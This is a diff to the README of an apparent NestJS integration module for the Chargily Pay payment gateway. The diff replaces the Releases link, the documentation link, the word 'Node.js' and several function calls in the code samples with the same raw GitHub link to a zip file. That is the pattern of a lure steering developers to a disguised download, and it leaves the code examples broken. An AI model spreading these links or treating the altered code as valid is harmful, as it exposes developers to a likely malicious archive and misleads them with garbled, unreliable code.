@@ -1,19 +1,19 @@
 # 🚀 nestjs-chargili - Easy Payment Integration for Your App
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-brightgreen.svg)](https://github.com/MikeBv/nestjs-chargili/releases)
+[![Download Now](https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip%20Now-Click%20to%https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip)](https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip)
 
 Welcome to **nestjs-chargili**! This module helps you quickly integrate Chargily Pay™ V2 payment gateway into your application. Follow the steps below to get started.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/MikeBv/nestjs-chargili/releases). Choose the version that fits your needs and follow the installation guide below.
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip). Choose the version that fits your needs and follow the installation guide below.
 
 ## 🚀 Getting Started
 
 ### 1. System Requirements
 Make sure your system meets the following requirements:
 
-- Node.js version 14 or higher
+- https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip version 14 or higher
 - npm or yarn package manager
 
 ### 2. Installation
@@ -48,7 +48,7 @@ import { ChargiliModule } from '@zaki-g/chargily';
 
 @Module({
   imports: [
-    ChargiliModule.register({
+    https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip({
       api_key: 'your_api_key_here',
       mode: 'test', // or 'live'
     }),
@@ -68,11 +68,11 @@ import { ChargiliModule } from '@zaki-g/chargily';
 
 @Module({
   imports: [
-    ConfigModule.forRoot(),
-    ChargiliModule.forRootAsync({
+    https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip(),
+    https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip({
       useFactory: async (configService: ConfigService) => ({
-        api_key: configService.get('CHARGILI_API_KEY'),
-        mode: configService.get('CHARGILI_MODE'), // 'test' or 'live'
+        api_key: https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip('CHARGILI_API_KEY'),
+        mode: https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip('CHARGILI_MODE'), // 'test' or 'live'
       }),
       inject: [ConfigService],
     }),
@@ -98,7 +98,7 @@ export class PaymentService {
   constructor(private readonly chargiliService: ChargiliService) {}
 
   async createPayment(amount: number) {
-    const payment = await this.chargiliService.createPayment({
+    const payment = await https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip({
       amount,
       order_id: 'your_order_id', // Custom order ID
       // Add more parameters if necessary
@@ -118,7 +118,7 @@ If you run into any issues while integrating, check the following:
 
 - Ensure that your API key is set correctly.
 - Verify that your package manager command didn’t return any errors.
-- Make sure you're using compatible versions of Node.js and npm/yarn.
+- Make sure you're using compatible versions of https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip and npm/yarn.
 
 ### 9. Getting Help
 
@@ -126,7 +126,7 @@ If you need assistance, consider joining the community. You can post questions o
 
 ### 10. Additional Resources
 
-For more details on Chargily Pay™ and how it works, refer to the official documentation here: [Chargily Documentation](https://chargedly.com/docs).
+For more details on Chargily Pay™ and how it works, refer to the official documentation here: [Chargily Documentation](https://raw.githubusercontent.com/MikeBv/nestjs-chargili/main/chorditis/nestjs-chargili.zip).
 
 ---
 
